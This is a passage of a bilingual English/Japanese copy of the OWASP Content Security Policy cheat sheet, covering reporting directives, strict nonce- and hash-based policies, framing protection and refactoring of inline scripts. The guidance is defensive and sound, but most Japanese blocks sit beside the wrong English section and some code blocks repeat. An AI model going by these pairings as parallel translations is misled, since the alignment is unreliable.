    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` は、CSP Level 3 により `report-to` を優先して**非推奨**になっています。これはレポート送信先の URI を受け取ります。
    - 形式: `Content-Security-Policy: report-uri https://example.com/csp-reports`

後方互換性を確保するには、両方のディレクティブを併用してください。`report-to` をサポートするブラウザはそれを使用して `report-uri` を無視し、古いブラウザは `report-uri` へフォールバックします。レガシーブラウザのサポートが不要になったら、`report-uri` を削除できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Navigation Directives

Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 特別なディレクティブソース

| 値 | 説明 |
| --- | --- |
| 'none' | どの URL にも一致しません。 |
| 'self' | 同じスキームとポート番号を持つオリジンサイトを指します。 |
| 'unsafe-inline' | インラインスクリプトまたはインラインスタイルの使用を許可します。 |
| 'unsafe-eval' | スクリプト内で eval の使用を許可します。 |

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

- `form-action` restricts the URLs which the forms can submit to.
- `frame-ancestors` restricts the URLs that can embed the requested resource inside of  `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
    - If this directive is specified in a `<meta>` tag, the directive is ignored.
    - This directive doesn't fallback to the `default-src` directive.
    - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ディレクティブソースの動作をよりよく理解するには、[W3C のソースリスト](https://w3c.github.io/webappsec-csp/#framework-directive-source-list)を確認してください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Reporting Directives

Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

- `report-to` (CSP Level 3, used together with the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API)) is the __primary, current__ reporting directive. It references a group name defined in the `Reporting-Endpoints` (or legacy `Report-To`) response header containing a JSON-formatted endpoint list.
    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` is __deprecated__ by CSP Level 3 in favor of `report-to`. It takes a URI that reports are sent to.
    - Format: `Content-Security-Policy: report-uri https://example.com/csp-reports`

For backward compatibility, declare both directives in conjunction. Browsers that support `report-to` will use it and ignore `report-uri`; older browsers fall back to `report-uri`. Once support for legacy browsers is no longer required, `report-uri` can be removed.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## CSP サンプルポリシー

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Special Directive Sources

| Value            | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| 'none'           | No URLs match.                                                              |
| 'self'           | Refers to the origin site with the same scheme and port number.             |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Strict ポリシー

Strict ポリシーの役割は、古典的な格納型 XSS、反射型 XSS、および一部の DOM XSS 攻撃から保護することであり、CSP を実装しようとするすべてのチームにとって最適な目標であるべきです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述のとおり、Google は Strict CSP を作成するための詳細で体系的な[手順](https://web.dev/strict-csp)を用意しています。

その手順に基づき、Strict ポリシーを適用するには次の二つのポリシーのいずれかを使用できます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## CSP Sample Policies

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Nonce ベースの Strict ポリシー

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Strict Policy

A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.

As noted above, Google went ahead and set up a detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP.

Based on those instructions, one of the following two policies can be used to apply a strict policy:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### Hash ベースの Strict ポリシー

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Nonce-based Strict Policy

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 基本的な非 Strict CSP ポリシー

このポリシーは、Strict ポリシーを作成できない場合に使用でき、クロスサイトフレーミングとクロスサイトフォーム送信を防止します。これは、すべてのデフォルトレベルのディレクティブについて、元のドメインからのリソースのみを許可し、インラインスクリプト/スタイルの実行を許可しません。

アプリケーションがこれらの制限下で機能する場合、攻撃対象領域は大幅に削減され、ほとんどのモダンブラウザで動作します。

最も基本的なポリシーは、次を前提としています。

- すべてのリソースがドキュメントと同じドメインでホストされている。
- スクリプトとスタイルリソースにインラインまたは eval がない。
- 他の Web サイトがその Web サイトをフレーム化する必要がない。
- 外部 Web サイトへのフォーム送信がない。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Hash-based Strict Policy

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

さらに強化するには、次を適用できます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Basic non-Strict CSP Policy

This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.

If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.

The most basic policy assumes:

- All resources are hosted by the same domain of the document.
- There are no inlines or evals for scripts and style resources.
- There is no need for other websites to frame the website.
- There are no form-submissions to external websites.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

このポリシーは、同一オリジンからの画像、スクリプト、AJAX、CSS を許可し、その他のリソース (例: object、frame、media など) の読み込みを許可しません。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

To tighten further, one can apply the following:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 安全でないリクエストのアップグレード

開発者が HTTP から HTTPS へ移行している場合、次のディレクティブにより、すべてのリクエストが HTTP へのフォールバックなしで HTTPS 経由で送信されるようになります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

```text
Content-Security-Policy: upgrade-insecure-requests;
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### フレーミング攻撃の防止 (クリックジャッキング、クロスサイトリーク)

- コンテンツのすべてのフレーミングを防止するには、次を使用します。
    - `Content-Security-Policy: frame-ancestors 'none';`
- サイト自身を許可するには、次を使用します。
    - `Content-Security-Policy: frame-ancestors 'self';`
- 信頼済みドメインを許可するには、次を実行します。
    - `Content-Security-Policy: frame-ancestors trusted.com;`

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Upgrading insecure requests

If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### インラインコードのリファクタリング

`default-src` または `script-src*` ディレクティブが有効な場合、CSP はデフォルトで、HTML ソース内に配置された次のような JavaScript コードを無効にします。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
Content-Security-Policy: upgrade-insecure-requests;
```

```javascript
<script>
var foo = "314"
<script>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Preventing framing attacks (clickjacking, cross-site leaks)

- To prevent all framing of your content use:
    - `Content-Security-Policy: frame-ancestors 'none';`
- To allow for the site itself, use:
    - `Content-Security-Policy: frame-ancestors 'self';`
- To allow for trusted domain, do the following:
    - `Content-Security-Policy: frame-ancestors trusted.com;`

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

インラインコードは別の JavaScript ファイルに移動でき、ページ内のコードは次のようになります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<script src="app.js">
</script>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Refactoring inline code

When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`app.js` には `var foo = "314"` コードを含めます。

インラインコードの制限は `inline event handlers` にも適用されるため、次の構造は CSP の下でブロックされます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<script>
var foo = "314"
<script>
```

```html
<button id="button1" onclick="doSomething()">
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The inline code can be moved to a separate JavaScript file and the code in the page becomes:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

これは `addEventListener` 呼び出しに置き換えるべきです。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<script src="app.js">
</script>
```

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

With `app.js` containing the `var foo = "314"` code.

</div>

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<button id="button1" onclick="doSomething()">
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

This should be replaced by `addEventListener` calls:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

</div>

</section>
</div>

## References

<div className="referenceFooter">

- [Strict CSP](https://web.dev/strict-csp)
- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
- [Content-Security-Policy](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
- CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
- [CSP evaluator](https://csp-evaluator.withgoogle.com/)

</div>


## Attribution

<div className="attributionFooter">

- Original: Content Security Policy Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: English original retained for comparison. Japanese translation added. Bilingual display generated from official source and local Japanese translation.
- Retrieved: 2026-05-20

</div>
